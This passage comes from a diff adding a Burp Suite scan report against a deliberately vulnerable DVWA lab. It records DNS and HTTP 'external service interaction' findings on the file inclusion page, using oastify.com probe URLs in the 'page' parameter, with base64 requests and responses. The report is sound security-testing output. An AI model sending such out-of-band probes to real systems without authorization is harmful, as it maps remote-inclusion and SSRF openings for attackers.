yYWJpbGl0aWVzL2NhcHRjaGEvIj5JbnNlY3VyZSBDQVBUQ0hBPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvc3FsaS8iPlNRTCBJbmplY3Rpb248L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9zcWxpX2JsaW5kLyI+U1FMIEluamVjdGlvbiAoQmxpbmQpPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvd2Vha19pZC8iPldlYWsgU2Vzc2lvbiBJRHM8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy94c3NfZC8iPlhTUyAoRE9NKTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3hzc19yLyI+WFNTIChSZWZsZWN0ZWQpPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMveHNzX3MvIj5YU1MgKFN0b3JlZCk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9jc3AvIj5DU1AgQnlwYXNzPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvamF2YXNjcmlwdC8iPkphdmFTY3JpcHQ8L2E+PC9saT4KPC91bD48dWwgY2xhc3M9Im1lbnVCbG9ja3MiPjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9zZWN1cml0eS5waHAiPkRWV0EgU2VjdXJpdHk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3BocGluZm8ucGhwIj5QSFAgSW5mbzwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vYWJvdXQucGhwIj5BYm91dDwvYT48L2xpPgo8L3VsPjx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL2xvZ291dC5waHAiPkxvZ291dDwvYT48L2xpPgo8L3VsPgoJCQkJPC9kaXY+CgoJCQk8L2Rpdj4KCgkJCTxkaXYgaWQ9Im1haW5fYm9keSI+CgoJCQkJCgkJCQk8YnIgLz48YnIgLz4KCQkJCQoKCQkJPC9kaXY+CgoJCQk8ZGl2IGNsYXNzPSJjbGVhciI+CgkJCTwvZGl2PgoKCQkJPGRpdiBpZD0ic3lzdGVtX2luZm8iPgoJCQkJPGlucHV0IHR5cGU9ImJ1dHRvbiIgdmFsdWU9IlZpZXcgSGVscCIgY2xhc3M9InBvcHVwX2J1dHRvbiIgaWQ9J2hlbHBfYnV0dG9uJyBkYXRhLWhlbHAtdXJsPScuLi8uLi92dWxuZXJhYmlsaXRpZXMvdmlld19oZWxwLnBocD9pZD1maSZzZWN1cml0eT1sb3cmbG9jYWxlPWVuJyApIj4gPGlucHV0IHR5cGU9ImJ1dHRvbiIgdmFsdWU9IlZpZXcgU291cmNlIiBjbGFzcz0icG9wdXBfYnV0dG9uIiBpZD0nc291cmNlX2J1dHRvbicgZGF0YS1zb3VyY2UtdXJsPScuLi8uLi92dWxuZXJhYmlsaXRpZXMvdmlld19zb3VyY2UucGhwP2lkPWZpJnNlY3VyaXR5PWxvdycgKSI+IDxkaXYgYWxpZ249ImxlZnQiPjxlbT5Vc2VybmFtZTo8L2VtPiBhZG1pbjxiciAvPjxlbT5TZWN1cml0eSBMZXZlbDo8L2VtPiBsb3c8YnIgLz48ZW0+TG9jYWxlOjwvZW0+IGVuPGJyIC8+PGVtPlBIUElEUzo8L2VtPiBkaXNhYmxlZDxiciAvPjxlbT5TUUxpIERCOjwvZW0+IG15c3FsPC9kaXY+CgkJCTwvZGl2PgoKCQkJPGRpdiBpZD0iZm9vdGVyIj4KCgkJCQk8cD5EYW1uIFZ1bG5lcmFibGUgV2ViIEFwcGxpY2F0aW9uIChEVldBKSB2MS4xMCAqRGV2ZWxvcG1lbnQqPC9wPgoJCQkJPHNjcmlwdCBzcmM9Jy4uLy4uLy9kdndhL2pzL2FkZF9ldmVudF9saXN0ZW5lcnMuanMnPjwvc2NyaXB0PgoKCQkJPC9kaXY+CgoJCTwvZGl2PgoKCTwvYm9keT4KCjwvaHRtbD4=]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>8672749588696366080</serialNumber>
+    <type>134217728</type>
+    <name><![CDATA[External service interaction (DNS)]]></name>
+    <host ip="172.22.0.3">http://web</host>
+    <path><![CDATA[/vulnerabilities/fi/]]></path>
+    <location><![CDATA[/vulnerabilities/fi/]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
+<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
+<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
+  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
+  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
+  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
+<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>
+
+<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
+    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>http://axbjjp290pf674c0bfqmrtxowf28qyeo2fp5du.oastify.com/?fuzz</b> was submitted in the <b>page</b> parameter.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="true"><![CDATA[R0VUIC92dWxuZXJhYmlsaXRpZXMvZmkvP3BhZ2U9aHR0cCUzYSUyZiUyZmF4YmpqcDI5MHBmNjc0YzBiZnFtcnR4b3dmMjhxeWVvMmZwNWR1Lm9hc3RpZnkuY29tJTJmJTNmZnV6eiBIVFRQLzEuMA0KSG9zdDogd2ViDQpDb29raWU6IHNlY3VyaXR5PWxvdw0KDQo=]]></request>
+      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBXZWQsIDIwIE1hciAyMDI0IDIwOjU5OjMzIEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU3IChEZWJpYW4pDQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuMTANClNldC1Db29raWU6IFBIUFNFU1NJRD1hdGRwbTF2anJqcmFoY2lxYm83azExOXVrZDsgcGF0aD0vDQpFeHBpcmVzOiBUdWUsIDIzIEp1biAyMDA5IDEyOjAwOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpDb250ZW50LUxlbmd0aDogMzE5Ng0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgNCg0KCjxodG1sPjxib2R5PjFleWJjcTg3OWtxeG9yNzd6dHp5bnJ6amxnaWdpZ2pmaWd6PC9ib2R5PjwvaHRtbD48IURPQ1RZUEUgaHRtbD4KCjxodG1sIGxhbmc9ImVuLUdCIj4KCgk8aGVhZD4KCQk8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCIgLz4KCgkJPHRpdGxlPlZ1bG5lcmFiaWxpdHk6IEZpbGUgSW5jbHVzaW9uIDo6IERhbW4gVnVsbmVyYWJsZSBXZWIgQXBwbGljYXRpb24gKERWV0EpIHYxLjEwICpEZXZlbG9wbWVudCo8L3RpdGxlPgoKCQk8bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiBocmVmPSIuLi8uLi9kdndhL2Nzcy9tYWluLmNzcyIgLz4KCgkJPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJcaW1hZ2UvaWNvIiBocmVmPSIuLi8uLi9mYXZpY29uLmljbyIgLz4KCgkJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iLi4vLi4vZHZ3YS9qcy9kdndhUGFnZS5qcyI+PC9zY3JpcHQ+CgoJPC9oZWFkPgoKCTxib2R5IGNsYXNzPSJob21lIj4KCQk8ZGl2IGlkPSJjb250YWluZXIiPgoKCQkJPGRpdiBpZD0iaGVhZGVyIj4KCgkJCQk8aW1nIHNyYz0iLi4vLi4vZHZ3YS9pbWFnZXMvbG9nby5wbmciIGFsdD0iRGFtbiBWdWxuZXJhYmxlIFdlYiBBcHBsaWNhdGlvbiIgLz4KCgkJCTwvZGl2PgoKCQkJPGRpdiBpZD0ibWFpbl9tZW51Ij4KCgkJCQk8ZGl2IGlkPSJtYWluX21lbnVfcGFkZGVkIj4KCQkJCTx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uLy4iPkhvbWU8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL2luc3RydWN0aW9ucy5waHAiPkluc3RydWN0aW9uczwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vc2V0dXAucGhwIj5TZXR1cCAvIFJlc2V0IERCPC9hPjwvbGk+CjwvdWw+PHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2JydXRlLyI+QnJ1dGUgRm9yY2U8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9leGVjLyI+Q29tbWFuZCBJbmplY3Rpb248L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9jc3JmLyI+Q1NSRjwvYT48L2xpPgo8bGkgY2xhc3M9InNlbGVjdGVkIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvZmkvLj9wYWdlPWluY2x1ZGUucGhwIj5GaWxlIEluY2x1c2lvbjwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3VwbG9hZC8iPkZpbGUgVXBsb2FkPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvY2FwdGNoYS8iPkluc2VjdXJlIENBUFRDSEE8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9zcWxpLyI+U1FMIEluamVjdGlvbjwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3NxbGlfYmxpbmQvIj5TUUwgSW5qZWN0aW9uIChCbGluZCk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy93ZWFrX2lkLyI+V2VhayBTZXNzaW9uIElEczwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3hzc19kLyI+WFNTIChET00pPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMveHNzX3IvIj5YU1MgKFJlZmxlY3RlZCk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy94c3Nfcy8iPlhTUyAoU3RvcmVkKTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2NzcC8iPkNTUCBCeXBhc3M8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9qYXZhc2NyaXB0LyI+SmF2YVNjcmlwdDwvYT48L2xpPgo8L3VsPjx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3NlY3VyaXR5LnBocCI+RFZXQSBTZWN1cml0eTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vcGhwaW5mby5waHAiPlBIUCBJbmZvPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9hYm91dC5waHAiPkFib3V0PC9hPjwvbGk+CjwvdWw+PHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vbG9nb3V0LnBocCI+TG9nb3V0PC9hPjwvbGk+CjwvdWw+CgkJCQk8L2Rpdj4KCgkJCTwvZGl2PgoKCQkJPGRpdiBpZD0ibWFpbl9ib2R5Ij4KCgkJCQkKCQkJCTxiciAvPjxiciAvPgoJCQkJCgoJCQk8L2Rpdj4KCgkJCTxkaXYgY2xhc3M9ImNsZWFyIj4KCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJzeXN0ZW1faW5mbyI+CgkJCQk8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iVmlldyBIZWxwIiBjbGFzcz0icG9wdXBfYnV0dG9uIiBpZD0naGVscF9idXR0b24nIGRhdGEtaGVscC11cmw9Jy4uLy4uL3Z1bG5lcmFiaWxpdGllcy92aWV3X2hlbHAucGhwP2lkPWZpJnNlY3VyaXR5PWxvdyZsb2NhbGU9ZW4nICkiPiA8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iVmlldyBTb3VyY2UiIGNsYXNzPSJwb3B1cF9idXR0b24iIGlkPSdzb3VyY2VfYnV0dG9uJyBkYXRhLXNvdXJjZS11cmw9Jy4uLy4uL3Z1bG5lcmFiaWxpdGllcy92aWV3X3NvdXJjZS5waHA/aWQ9Zmkmc2VjdXJpdHk9bG93JyApIj4gPGRpdiBhbGlnbj0ibGVmdCI+PGVtPlVzZXJuYW1lOjwvZW0+IGFkbWluPGJyIC8+PGVtPlNlY3VyaXR5IExldmVsOjwvZW0+IGxvdzxiciAvPjxlbT5Mb2NhbGU6PC9lbT4gZW48YnIgLz48ZW0+UEhQSURTOjwvZW0+IGRpc2FibGVkPGJyIC8+PGVtPlNRTGkgREI6PC9lbT4gbXlzcWw8L2Rpdj4KCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJmb290ZXIiPgoKCQkJCTxwPkRhbW4gVnVsbmVyYWJsZSBXZWIgQXBwbGljYXRpb24gKERWV0EpIHYxLjEwICpEZXZlbG9wbWVudCo8L3A+CgkJCQk8c2NyaXB0IHNyYz0nLi4vLi4vL2R2d2EvanMvYWRkX2V2ZW50X2xpc3RlbmVycy5qcyc+PC9zY3JpcHQ+CgoJCQk8L2Rpdj4KCgkJPC9kaXY+CgoJPC9ib2R5PgoKPC9odG1sPg==]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+    <collaboratorEvent>
+      <interactionType>DNS</interactionType>
+      <originIp>162.158.201.117</originIp>
+      <time>2024-Mar-20 20:59:33.495 UTC</time>
+      <lookupType>AAAA</lookupType>
+      <lookupHost>axbjjp290pf674c0bfqmrtxowf28qyeo2fp5du.oastify.com</lookupHost>
+    </collaboratorEvent>
+  </issue>
+  <issue>
+    <serialNumber>6560378895106812928</serialNumber>
+    <type>134217728</type>
+    <name><![CDATA[External service interaction (HTTP)]]></name>
+    <host ip="172.22.0.3">http://web</host>
+    <path><![CDATA[/vulnerabilities/fi/]]></path>
+    <location><![CDATA[/vulnerabilities/fi/]]></location>
+    <severity>High</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
+However, in many cases, it can indicate a vulnerability with serious consequences.</p>
+<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
+  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
+  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
+  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
+  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
+  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
+  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
+<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>
+
+<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
+    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTP requests to arbitrary domains.<br><br>The payload <b>http://2ilb4hn1lh0yswxsw7becligh7n0bqzgn7axym.oastify.com/?fuzz</b> was submitted in the <b>page</b> parameter.<br><br>The application performed an HTTP request to the specified domain.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="true"><![CDATA[R0VUIC92dWxuZXJhYmlsaXRpZXMvZmkvP3BhZ2U9aHR0cCUzYSUyZiUyZjJpbGI0aG4xbGgweXN3eHN3N2JlY2xpZ2g3bjBicXpnbjdheHltLm9hc3RpZnkuY29tJTJmJTNmZnV6eiBIVFRQLzEuMA0KSG9zdDogd2ViDQpDb29raWU6IHNlY3VyaXR5PWxvdw0KDQo=]]></request>
+      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBXZWQsIDIwIE1hciAyMDI0IDIwOjU5OjMzIEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU3IChEZWJpYW4pDQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuMTANClNldC1Db29raWU6IFBIUFNFU1NJRD05Y2ZjOWJnN2UwOHNzM29tMmZqZWgyNmEzOTsgcGF0aD0vDQpFeHBpcmVzOiBUdWUsIDIzIEp1biAyMDA5IDEyOjAwOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpDb250ZW50LUxlbmd0aDogMzE5Ng0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgNCg0KCjxodG1sPjxib2R5PjFleWJjcTg3OWtxeG9yNzd6dHp5bnJ6amxnaWdpZ2pmaWd6PC9ib2R5PjwvaHRtbD48IURPQ1RZUEUgaHRtbD4KCjxodG1sIGxhbmc9ImVuLUdCIj4KCgk8aGVhZD4KCQk8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCIgLz4KCgkJPHRpdGxlPlZ1bG5lcmFiaWxpdHk6IEZpbGUgSW5jbHVzaW9uIDo6IERhbW4gVnVsbmVyYWJsZSBXZWIgQXBwbGljYXRpb24gKERWV0EpIHYxLjEwICpEZXZlbG9wbWVudCo8L3RpdGxlPgoKCQk8bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiBocmVmPSIuLi8uLi9kdndhL2Nzcy9tYWluLmNzcyIgLz4KCgkJPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJcaW1hZ2UvaWNvIiBocmVmPSIuLi8uLi9mYXZpY29uLmljbyIgLz4KCgkJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iLi4vLi4vZHZ3YS9qcy9kdndhUGFnZS5qcyI+PC9zY3JpcHQ+CgoJPC9oZWFkPgoKCTxib2R5IGNsYXNzPSJob21lIj4KCQk8ZGl2IGlkPSJjb250YWluZXIiPgoKCQkJPGRpdiBpZD0iaGVhZGVyIj4KCgkJCQk8aW1nIHNyYz0iLi4vLi4vZHZ3YS9pbWFnZXMvbG9nby5wbmciIGFsdD0iRGFtbiBWdWxuZXJhYmxlIFdlYiBBcHBsaWNhdGlvbiIgLz4KCgkJCTwvZGl2PgoKCQkJPGRpdiBpZD0ibWFpbl9tZW51Ij4KCgkJCQk8ZGl2IGlkPSJtYWluX21lbnVfcGFkZGVkIj4KCQkJCTx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uLy4iPkhvbWU8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL2luc3RydWN0aW9ucy5waHAiPkluc3RydWN0aW9uczwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vc2V0dXAucGhwIj5TZXR1cCAvIFJlc2V0IERCPC9hPjwvbGk+CjwvdWw+PHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2JydXRlLyI+QnJ1dGUgRm9yY2U8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9leGVjLyI+Q29tbWFuZCBJbmplY3Rpb248L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9jc3JmLyI+Q1NSRjwvYT48L2xpPgo8bGkgY2xhc3M9InNlbGVjdGVkIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvZmkvLj9wYWdlPWluY2x1ZGUucGhwIj5GaWxlIEluY2x1c2lvbjwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3VwbG9hZC8iPkZpbGUgVXBsb2FkPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvY2FwdGNoYS8iPkluc2VjdXJlIENBUFRDSEE8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9zcWxpLyI+U1FMIEluamVjdGlvbjwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3NxbGlfYmxpbmQvIj5TUUwgSW5qZWN0aW9uIChCbGluZCk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy93ZWFrX2lkLyI+V2VhayBTZXNzaW9uIElEczwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3hzc19kLyI+WFNTIChET00pPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMveHNzX3IvIj5YU1MgKFJlZmxlY3RlZCk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy94c3Nfcy8iPlhTUyAoU3RvcmVkKTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2NzcC8iPkNTUCBCeXBhc3M8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9qYXZhc2NyaXB0LyI+SmF2YVNjcmlwdDwvYT48L2xpPgo8L3VsPjx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3NlY3VyaXR5LnBocCI+RFZXQSBTZWN1cml0eTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vcGhwaW5mby5waHAiPlBIUCBJbmZvPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9hYm91dC5waHAiPkFib3V0PC9hPjwvbGk+CjwvdWw+PHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vbG9nb3V0LnBocCI+TG9nb3V0PC9hPjwvbGk+CjwvdWw+CgkJCQk8L2Rpdj4KCgkJCTwvZGl2PgoKCQkJPGRpdiBpZD0ibWFpbl9ib2R5Ij4KCgkJCQkKCQkJCTxiciAvPjxiciAvPgoJCQkJCgoJCQk8L2Rpdj4KCgkJCTxkaXYgY2xhc3M9ImNsZWFyIj4KCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJzeXN0ZW1faW5mbyI+CgkJCQk8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iVmlldyBIZWxwIiBjbGFzcz0icG9wdXBfYnV0dG9uIiBpZD0naGVscF9idXR0b24nIGRhdGEtaGVscC11cmw9Jy4uLy4uL3Z1bG5lcmFiaWxpdGllcy92aWV3X2hlbHAucGhwP2lkPWZpJnNlY3VyaXR5PWxvdyZsb2NhbGU9ZW4nICkiPiA8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iVmlldyBTb3VyY2UiIGNsYXNzPSJwb3B1cF9idXR0b24iIGlkPSdzb3VyY2VfYnV0dG9uJyBkYXRhLXNvdXJjZS11cmw9Jy4uLy4uL3Z1bG5lcmFiaWxpdGllcy92aWV3X3NvdXJjZS5waHA/aWQ9Zmkmc2VjdXJpdHk9bG93JyApIj4gPGRpdiBhbGlnbj0ibGVmdCI+PGVtPlVzZXJuYW1lOjwvZW0+IGFkbWluPGJyIC8+PGVtPlNlY3VyaXR5IExldmVsOjwvZW0+IGxvdzxiciAvPjxlbT5Mb2NhbGU6PC9lbT4gZW48YnIgLz48ZW0+UEhQSURTOjwvZW0+IGRpc2FibGVkPGJyIC8+PGVtPlNRTGkgREI6PC9lbT4gbXlzcWw8L2Rpdj4KCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJmb290ZXIiPgoKCQkJCTxwPkRhbW4gVnVsbmVyYWJsZSBXZWIgQXBwbGljYXRpb24gKERWV0EpIHYxLjEwICpEZXZlbG9wbWVudCo8L3A+CgkJCQk8c2NyaXB0IHNyYz0nLi4vLi4vL2R2d2EvanMvYWRkX2V2ZW50X2xpc3RlbmVycy5qcyc+PC9zY3JpcHQ+CgoJCQk8L2Rpdj4KCgkJPC9kaXY+CgoJPC9ib2R5PgoKPC9odG1sPg==]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+    <collaboratorEvent>
+      <interactionType>HTTP</interactionType>
+      <originIp>79.198.83.85</originIp>
+      <time>2024-Mar-20 20:59:33.933 UTC</time>
+      <requestresponse>
+        <request method="GET" base64="true"><![CDATA[R0VUIC8/ZnV6eiBIVFRQLzEuMQ0KSG9zdDogMmlsYjRobjFsaDB5c3d4c3c3YmVjbGlnaDduMGJxemduN2F4eW0ub2FzdGlmeS5jb20NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
